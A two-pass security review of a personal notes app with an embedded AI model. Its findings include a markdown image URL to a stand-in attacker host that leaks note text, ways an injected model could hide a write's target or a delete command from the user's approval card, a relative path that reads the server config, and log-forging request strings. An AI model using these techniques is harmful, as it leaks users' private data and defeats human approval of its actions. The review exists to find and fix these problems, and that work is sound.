# Security review — 2026-10-23

Review of commit `5ce279af` for pkm-3y4b, covering routes added
since the 2026-07-14 review and the embedded assistant boundaries.
The threat model is defined in [SECURITY.md](SECURITY.md).

Severity is assessed within the single-user, Tailscale-only threat model.
No fixes were made. Exploit prerequisites are separate from reproduced
behavior; no real prompt-injection attack against a provider was attempted.

The review ran in two passes. The first covered the bean's listed
surfaces; the second covered the routes and boundaries that had also
arrived since 2026-07-14 but were not on that list: exports, asset
delete and search, page routes on `wholepath` titles, assistant approval
binding, the `pkm-mcp` server, auth and WebSocket changes, the
service worker, and dependency advisories.

## Summary

| Severity | Finding | Pass |
|---|---|---|
| High | [Assistant output provides an unapproved outbound data channel](#high-assistant-output-provides-an-unapproved-outbound-data-channel) | 1 |
| Medium | [Any host in the tailnet is same-site, and the WebSocket streams note text to any Origin](#medium-any-host-in-the-tailnet-is-same-site-and-the-websocket-streams-note-text-to-any-origin) | 2 |
| Medium | [Batch approval can conceal the target of a write](#medium-batch-approval-can-conceal-the-target-of-a-write) | 1 |
| Medium | [The collapsed approval card hides any argument after the first 300 characters](#medium-the-collapsed-approval-card-hides-any-argument-after-the-first-300-characters) | 2 |
| Medium | [A string-encoded `batch.commands` hides whole commands from the card](#medium-a-string-encoded-batchcommands-hides-whole-commands-from-the-card) | 2 |
| Low | [`upload_asset` reads host files relative to the server's working directory](#low-upload_asset-reads-host-files-relative-to-the-servers-working-directory) | 2 |
| Low | [A title with control whitespace resolves to a different page](#low-a-title-with-control-whitespace-resolves-to-a-different-page) | 2 |
| Low | [Whole-graph export and the nightly markdown backup drop pages whose names collide on APFS](#low-whole-graph-export-and-the-nightly-markdown-backup-drop-pages-whose-names-collide-on-apfs) | 2 |
| Low | [Login backoff, pre-auth bodies and cookie parsing](#low-login-backoff-pre-auth-bodies-and-cookie-parsing) | 2 |
| Low | [Unauthenticated requests can forge access-log lines](#low-unauthenticated-requests-can-forge-access-log-lines) | 1 |
| Low | [Diagnostics accepts and logs an unbounded body](#low-diagnostics-accepts-and-logs-an-unbounded-body) | 1 |
| Low | [Availability: requests that 500 or run unbounded](#low-availability-requests-that-500-or-run-unbounded) | 2 |
| Low | [MCP read tools follow `../` in titles to other routes](#low-mcp-read-tools-follow--in-titles-to-other-routes) | 2 |

## First pass

### High: assistant output provides an unapproved outbound data channel

Assistant replies render through `tokenizeBlock` and `InlineSegments` in
[AssistantPanel.tsx](../web/src/assistant/AssistantPanel.tsx).
[AssetImage](../web/src/components/AssetImage.tsx) renders external image
URLs directly. A model that has read sensitive notes can emit
`![citation](https://attacker.invalid/collect?note=SECRET)` and the browser
requests that URL without a click or write confirmation. Disabling the
harness's web tools does not block this channel.

An attacker needs to influence text the assistant reads, successfully
inject the model, and cause it to include sensitive data in an image URL.
The generated image must be near the viewport because loading is lazy.
The outbound channel was reproduced in fresh Chromium using the actual
tokenizer and image component, a synthetic secret, and intercepted network
requests. No secret or request was sent to an external host. The model
injection step itself was not tested.

### Medium: batch approval can conceal the target of a write

`_batch_lines` in [policy.py](../server/src/pkm/assistant/policy.py) clips
the whole serialized `params` object. With an update command whose params
contain `text` first (4,000 characters), followed by
`uid: "sensitive-block"`, the UID disappears from the preview. The real
`validate_batch` accepts this payload and `plan_batch` plans writes to that
block. “Show full preview” only expands the already-clipped server string.

This was reproduced with the real validation, planning and preview
functions. A malicious or injected model can conceal a short target after
long content; the user must still approve the incomplete card. This goes
beyond clipping a long individual value: the target is omitted altogether.

### Low: unauthenticated requests can forge access-log lines

[RequestLogMiddleware](../server/src/pkm/server/request_log.py) passes the
decoded URL path to [request_line](../server/src/pkm/server/logfmt.py),
which interpolates it without escaping control characters. An anonymous
request to `/api/local/probe%0aFORGED%20LOG%20ENTRY%1b%5b31m` returned 401
but logged a literal newline and ANSI escape. A reachable client can forge
apparent log entries or alter terminal presentation without logging in.
This affects log integrity; no authentication bypass was demonstrated.

### Low: diagnostics accepts and logs an unbounded body

`ClientDiagnosticsRequest` and `client_diagnostics` in
[routes_sync.py](../server/src/pkm/server/routes_sync.py) have no body,
field-length or logging-size bound. An authenticated request containing a
2 MiB report string returned 200 and emitted the complete payload. Repeated
large reports can consume memory, log storage and logging time. Log rotation
is time-based, so it does not bound a day's volume. Resource exhaustion was
not attempted.

The diagnostics JSON encoding did escape newlines, carriage returns and
ANSI controls in the probe; its payload did not forge log lines. The
access-log finding is a separate path.

### Boundary observations

- **Local files:** no traversal, decoding, symlink, iCloud-stub containment,
  disposition or error-page escaping bypass was found. Checks precede file
  opening, so a concurrent filesystem writer could race a path replacement;
  that prerequisite is outside the documented private-directory threat
  model. Hidden files remain directly readable by an authenticated client;
  hiding them from the picker is not access control.
- **GoodLinks:** the sanitizer and iframe block script execution and omit
  same-origin permission. The gateway sends its bearer token to the locally
  configured destination, defaults to loopback, and does not follow
  redirects. Request URLs remain query/JSON data, not gateway destinations.
  `save=true` delegates URL fetching to GoodLinks; the external app's fetch
  restrictions were not tested.
- **GoodLinks URL parsing:** `sanitize_article` preserves
  `<img src="https:/api/export.zip">` despite its stated relative-URL ban.
  Chromium resolves it to the app host. The isolated fixture sent no
  `SameSite=Lax` cookie and still blocked scripts, so no authenticated
  disclosure or XSS was demonstrated. Absolute app-origin URLs are already
  permitted; this is a mismatch with the documented invariant, not a new
  demonstrated capability.
- **Image descriptions:** the complete stored image is base64-encoded,
  including any EXIF/GPS or appended metadata, and sent with a fixed prompt,
  MIME type and configured model to OpenAI's fixed HTTPS endpoint. No note
  text, filename or filesystem path is included. Byte preservation was
  verified with a synthetic marker and a mocked transport. Processing is
  enabled at startup when a key exists and `image_descriptions` is true
  (the default); the key file takes precedence over the environment. Uploads
  enqueue automatically; historical assets require authenticated
  `/api/assets/scan`. Disabling requires a configuration change and restart.
  The eligibility and size policy lives in `describe/core.py`.
- **Assistant permissions:** unknown tool names are denied; write tools
  await confirmation; built-ins and filesystem settings are disabled.
  Subprocess credential files have mode `0600`, but deleting them does not
  revoke their ordinary session tokens, as already documented. A real
  provider/harness session was not exercised.

### First-pass verification and limits

A temporary-database route-table probe exercised every registered private
HTTP method/route combination: all 49 returned 401 anonymously. The
WebSocket rejected the handshake (ASGI close code 4401); login, health and
the fixture SPA/static files remained public. This was a one-off probe,
not a new permanent contract test.

Focused existing suites passed: 75 auth/hostile-request/logging/WebSocket,
226 local-file, 146 GoodLinks/image-description, and 168 assistant/MCP tests.
These were targeted runs without the whole-project coverage gate, not full
backend/frontend verification. Additional probes used temporary data,
mocked provider transports and intercepted browser requests. Production,
real provider calls, dependency advisories and a complete deployment audit
were outside this review. No application code or tests were changed.


## Second pass

Probes ran in-process (FastAPI `TestClient` or raw ASGI) against
temporary databases built with `tests/conftest.py`, the real policy,
preview, MCP-tool and client functions, and, for the harness
environment, the bundled Claude CLI pointed at a closed loopback port.
No server was started, no provider was called, and production was not
touched. No application code or tests were changed.

### Medium: any host in the tailnet is same-site, and the WebSocket streams note text to any Origin

`SameSite` is decided by registrable domain. The Public Suffix List
lists `ts.net` (checked in the copy bundled with OpenJDK, 2026-09-15),
so `machine.<tailnet>.ts.net` belongs to the site `<tailnet>.ts.net`.
Every other host in the same tailnet, including any service published
with Tailscale Funnel, is therefore same-site with PKM.

`ws_endpoint` in [ws.py](../server/src/pkm/server/ws.py) checks the
session but not the `Origin`. A WebSocket handshake counts as a
subresource request, so a page on a sibling host would send the `Lax`
cookie. Each `OpsFrame` carries the applied ops, including the full text
of created and updated blocks. A handshake with
`Origin: https://other-host.<tailnet>.ts.net` was accepted, and a
subsequent `POST /api/ops` arrived on that socket with its block text.
The attacker's page then reads every edit, from any device, for as long
as it stays open.

An attacker needs script on another host in the tailnet, such as XSS in
a Funnel-exposed or self-hosted app, while the user holds a PKM session.
That the browser sends the cookie on the cross-origin, same-site
handshake follows from the SameSite rules but was not run in a browser.

The same sibling page can also send "simple" requests with the cookie.
Every JSON-model route refuses them (FastAPI's `strict_content_type`
answers 422 for `text/plain`, form or missing content types). The routes
that accept them are `POST /api/journal/cleanup`,
`POST /api/assets/scan?force=true`, which with an OpenAI key re-sends
every eligible image to OpenAI and costs money, `POST /api/assets`
(multipart), the assistant close beacon and `POST /api/assets/export.zip`.
Hosts in other tailnets and the Internet are cross-site; for them the
only cookie-carrying requests are top-level GETs, and the only GETs with
a side effect create today's empty daily page.

### Medium: the collapsed approval card hides any argument after the first 300 characters

`ConfirmCard` in
[AssistantPanel.tsx](../web/src/assistant/AssistantPanel.tsx) shows
`PREVIEW_COLLAPSE_THRESHOLD` (300) characters of the preview until
"Show full preview" is clicked, and Allow works while the card is
collapsed. `ops_preview` in
[policy.py](../server/src/pkm/assistant/policy.py) renders arguments in
the order the model emitted them. So an injected model can put any
write's target after one long value. With the real `ops_preview` and the
card's slice logic:

| Call, keys in emitted order | Hidden from the collapsed card |
|---|---|
| `update_block(text="Tidied wording. "×20, uid="VICTIMUID01")` | `uid` |
| `upload_asset(page="Holiday photos "×19, path="../../data/config.json")` | `path` |
| `rename_page(title="Inbox", new_title="Projects / "+"x"×300, allow_merge=true)` | `allow_merge` |

This applies to every write tool and needs about 300 characters, where
the first-pass batch finding needs 4,000. String values are also
inserted unescaped (`_clip`), so a value containing `)\n, uid=…` can draw
a convincing fake argument list; the real argument still appears after
it. The browser rendering itself was not exercised.

### Medium: a string-encoded `batch.commands` hides whole commands from the card

`ops_preview` lists each batch operation only when `commands` is a list.
When it arrives as a JSON string, the generic dump clips the one string
at `_MAX_PREVIEW_VALUE_CHARS` and shows no operation count. FastMCP's
`pre_parse_json` then parses the string back into a list, and
`apply_batch` runs every command. With
`commands = json.dumps([create with "lorem ipsum "×400, delete VICTIMUID02])`
the 4,016-character preview contained neither `delete` nor the UID even
when expanded, `validate_batch` accepted the parsed list, and
`mcp.call_tool("batch", …)` handed both commands to a stubbed
`apply_batch`.

This needs the model to emit a string where the schema says array, and
the Claude CLI to pass that through to `can_use_tool` without schema
validation. The CLI's behaviour was not tested; if it rejects
schema-violating input, this does not apply.

### Low: `upload_asset` reads host files relative to the server's working directory

The `upload_asset` tool in [mcp/server.py](../server/src/pkm/mcp/server.py)
uploads any regular file the service account can read, following
symlinks, with no containment. The gate is the file name's extension
(`mimetypes.guess_type` against `ALLOWED_UPLOAD_MIME`) and
`max_upload_bytes`. A relative path resolves against the MCP process's
working directory, and the server's launchd template sets that to
`{{PKM_HOME}}/app/server`. So `../../data/config.json`, which reads like
a harmless relative path, names the production config holding the
session secret and password hash; a synthetic copy uploaded and was
linked from today's daily note. Extensionless key files (`openai_key`,
`zai_key`, `goodlinks_key`) were refused with 415; `/dev/zero`, FIFOs,
directories and `~` paths were refused as missing files.

The card shows the path exactly as emitted, with no resolved path,
symlink target, size or type. The model gets back only the asset URL
(which embeds the sha256); the copy is then served to any session and
included in exports and backups. Approval is required, and the previous
finding can push `path` out of the collapsed card. A race between the
`is_file()` check and the open was not tested.

### Low: a title with control whitespace resolves to a different page

`normalize_title` in [refs.py](../server/src/pkm/refs.py) returns a
title without control whitespace byte for byte, but when one is present
it collapses every whitespace run, including runs of plain spaces. With
pages `A  B` (two spaces) and `A B` both present:
`GET`, `DELETE` and `POST …/rename` on `/api/page/A%20%20B%0A` all acted
on `A B`, and `PkmClient.rename_page("A  B\n", …)`, the path the MCP
`rename_page` tool takes, renamed `A B`. The SPA never sends control
whitespace. The exposure is the assistant: the card shows the raw
`title`, while the server renames or, with `allow_merge`, irreversibly
merges a different page. Titles also admit NUL, other C0 controls and
both NFC and NFD spellings, so two distinct pages can look identical on
a card.

### Low: whole-graph export and the nightly markdown backup drop pages whose names collide on APFS

`page_filename` in [export/markdown.py](../server/src/pkm/export/markdown.py)
deduplicates with `str.lower()`, but the staging directory is on APFS,
which also folds Unicode normalization and full case folding. `café`
(NFC) and `café` (NFD), `Straße` and `STRASSE`, `ς` and `σ`, and `ﬀ` and
`ff` each received distinct names and then overwrote one another: four
such titles produced two files. `export_graph` still counts every page,
so the loss is silent. The database backup is unaffected; the markdown
export and its git history lose the page. No attacker is needed; this is
listed because the export is a backup.

### Low: login backoff, pre-auth bodies and cookie parsing

- **Concurrent login guesses.** `login` in
  [auth.py](../server/src/pkm/server/auth.py) checks the throttle before
  the password and records the failure afterwards. Two hundred
  concurrent wrong passwords from one source ran 40 scrypt checks (the
  anyio thread limit) in 0.25 s, against one for sequential attempts.
  A burst each backoff period guesses about forty times faster.
- **Throttle key.** The key is `request.client.host`. `run.py` leaves
  uvicorn's defaults, so for loopback connections, which is how
  Tailscale Serve connects, the key is the right-most non-loopback
  `X-Forwarded-For` entry. SECURITY.md's statement that every tailnet
  client shares the proxy's bucket held only if Serve sends no such
  header; the Tailscale binary contains `addProxyForwardedHeaders`.
  The direct listener ignored a spoofed header. Whether Serve passes a
  client-supplied header through unchanged was not tested.
- **Bodies are read before auth.** FastAPI parses the body before
  resolving `require_auth`, so an anonymous 64 MiB `POST /api/ops` was
  held in memory and an anonymous 64 MiB multipart `POST /api/assets` was
  spooled to `$TMPDIR` before the 401. `max_upload_bytes` is enforced only
  after auth.
- **Non-ASCII session cookie.** `verify_session` in `auth_core.py` passes
  the signature `str` to `hmac.compare_digest`, which raises `TypeError`
  for non-ASCII characters. `Cookie: pkm_session=v1.123.é` made an
  anonymous request, and the WebSocket handshake, fail with a 500 and a
  logged traceback. There is no bypass.

### Low: availability: requests that 500 or run unbounded

None of these is reachable anonymously except the first. The rest need
data that the owner, an approved assistant write, an import or a synced
device put in the graph; once it exists, a cross-site top-level GET can
trigger the GET routes.

| Trigger | Effect | Owner |
|---|---|---|
| `GET /%00` or a path component over `NAME_MAX`, anonymous | 500 with a logged traceback from the SPA catch-all (`resolve()`/`is_file()` unguarded) | `create_app` → `spa` in `app.py` |
| Single-page export of K nested `((refs))` per level | Output grows as K³; about 11 KB of blocks gave a 279 MB response and 1.4 GiB RSS | `export/resolve.py`, `routes_export.export_page_markdown` |
| Outline 255 or more levels deep | `GET /api/page`, `/api/block` and, on today's daily, `/api/journal` answer 500 (pydantic serialization depth) | `server/tree.build_tree` |
| A deep chain of blocks each linking the target | Backlink breadcrumbs cost about O(depth³): 56 s and 27 MiB at depth 2,000 | `routes_pages._fetch_ancestors` |
| More than 32,766 blocks on a page, refs to a block, or distinct refs in an export | 500 from SQLite's variable limit | `_block_ref_counts`, `_fetch_ancestors`, `_gather_resolution_data` |
| `{and: …}` nested about 500 deep, or more than 500 `or`/`and` operands | `/api/query` (and `{{query}}` in export) answers 500 | `server/query.py`, `query_exec.py` |
| Legacy block text with `[[` nested about 1,000 deep | rename, delete and delete-preview of the target answer 500 (`RecursionError`); `/api/ops` already refuses such text | `unlink._unlink_range`, `rename._rewrite_range` |

`/api/ops` imposes no depth cap, so the outline cases are creatable with
ordinary writes. Each whole-graph export also stages a full copy of the
asset store in `$TMPDIR`, with no concurrency limit.

### Low: MCP read tools follow `../` in titles to other routes

`PkmClient.get_page` quotes the title with `safe="/"`, and httpx2
normalises dot segments, so the auto-allowed `get_page` and `backlinks`
tools with a title like `../sync/snapshot` request `/api/sync/snapshot`.
In-process, the real tool reached `/api/sync/snapshot`,
`/api/goodlinks/check` and `/healthz`. Only a body that validates as
`PagePayload` reaches the model, and schema errors name fields only, so
nothing was disclosed and no GET with a side effect was found. What
remains is unapproved expensive work, such as a full snapshot,
`export.zip` or a GoodLinks fetch.

### Second-pass observations

- **On-device data.** Each device keeps the full replica in OPFS, the
  unsent outbox, up to 400 viewed uploads in Cache Storage (served
  `CacheFirst` with no auth check) and preferences. A 401 only redirects
  to `/login`; nothing clears these on expiry or on `session_secret`
  rotation, and offline reads fall back to the replica whatever the
  cookie state. Rotation ends sessions, not on-device copies. The
  service worker never caches `/api`.
- **Harness environment.** The harness and pkm-mcp inherit the whole
  server environment, including `OPENAI_API_KEY`, `GOODLINKS_API_KEY`,
  `ANTHROPIC_AUTH_TOKEN` (the z.ai key for `glm`) and `PKM_URL`. No tool
  reads the environment beyond `PKM_CLI_CONFIG` and `PKM_URL`, and macOS
  has no `/proc/self/environ` for `upload_asset` to read, so nothing was
  disclosed.
- **One confirm slot.** A second `confirm_request` replaces the card
  shown. Each decision is bound to its own id, so the wrong call is never
  approved, but the card can change under the cursor.
- **Response headers.** As documented, no response carries CSP,
  anti-framing, `Referrer-Policy` or HSTS; authenticated JSON also has
  no `Cache-Control: no-store`.
- **Export filenames.** Windows-reserved names, `<>|?*"` and bidi
  controls survive into archive names; none escapes the extraction
  directory.

### Dependency advisories

`pip-audit` reported 27 advisories in 7 Python packages: pyjwt and
cryptography (pulled in only by `mcp[crypto]`, unused over stdio), mcp
(its Streamable HTTP transport, unused), anyio, httpx2/httpcore2 and
certifi. None is reachable in a way that matters here.

`pnpm audit --prod` reported 15. The critical and high ones are in
dompurify 3.4.11, reached only through mermaid's fallback renderer; they
need `SAFE_FOR_TEMPLATES` or `IN_PLACE`, and mermaid 11.16.0's sanitize
calls pass neither. mermaid's own advisories (prototype pollution, CSS
injection, diagram DoS) apply on that fallback path to diagram text in
the user's notes. react-router's open redirect is not reachable: every
navigation target is built from a fixed prefix. The remaining 40 of the
55 in a full audit are dev and build tools. All are cheap upgrades.

### What held

- **Exports and assets.** `Content-Disposition` stayed printable ASCII
  for 23 hostile titles (CRLF, quotes, `; filename=`, U+2028); no
  archive name had `..`, a leading `/`, a backslash, a drive letter or a
  control character; `parse_sha256` rejected every non-canonical digest;
  LIKE and FTS input stayed literal; temp directories were removed on
  error and on client disconnect.
- **SPA catch-all.** Encoded traversal, a prefix-sibling directory, an
  outward symlink and `%0a` all returned `index.html` or 404. The build
  ships no sourcemaps or local paths.
- **Page and graph routes.** Every SQL value is bound; f-strings
  interpolate only constants and placeholder lists. Rename onto an
  existing page is 409 without `allow_merge`, including after
  normalization. Apart from creating today's daily, no GET in scope
  changed the database.
- **Approval binding.** Each confirm is bound to its own `confirm-N`
  future; approval returns the original input, the same dict the card
  rendered. Replays, unknown ids and late confirms after a turn ends are
  no-ops; a second concurrent turn gets 409; no allow rule is ever added.
  User and project MCP servers in `~/.claude.json` or `.mcp.json` were
  not loaded.
- **Auth.** Session tokens cannot be forged; the scrypt and HMAC
  comparisons are constant-time; scrypt concurrency is capped; the
  WebSocket refuses an anonymous handshake and bounds its queue. JSON
  routes refuse simple cross-origin requests.

### Second-pass limits

Not exercised: a real browser (the same-site WebSocket cookie, the
card's rendering, on-device storage), Tailscale Serve's header handling,
whether the Claude CLI validates MCP input against the tool schema, a
real model or provider, uvicorn-level limits under real sockets, and
resource exhaustion beyond single requests.
